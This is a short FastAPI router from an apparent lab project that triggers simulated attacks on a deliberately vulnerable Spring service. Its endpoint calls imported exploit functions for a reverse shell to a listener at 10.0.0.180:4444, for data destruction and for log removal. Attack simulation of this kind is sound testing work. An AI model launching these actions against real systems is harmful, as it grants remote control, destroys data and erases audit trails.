from fastapi import APIRouter
import sys 
from models.simulation_info import SimulationInfo

sys.path.append('/home/ubuntu/ContMigration-VT1/apps/kubernetes/vuln-spring/')

from vuln_spring_exploit import reverse_shell, data_destruction, log_removal # type: ignore

router = APIRouter()
target_url = "http://10.0.0.29:30080"

@router.post("")
def simulate(simInfo: SimulationInfo):
    print(f"Received simulation request for {simInfo.attackType}")
    print(f"App name: {simInfo.appName}")
    if simInfo.attackType == "reverse_shell":
        reverse_shell(target_url, "10.0.0.180","4444")
        return {"message": "Reverse shell command executed"}
    elif simInfo.attackType == "data_destruction":
        data_destruction(target_url)
        return {"message": "Data destruction command executed"}
    elif simInfo.attackType == "log_removal":
        log_removal(target_url)
        return {"message": "Log removal command executed"}
    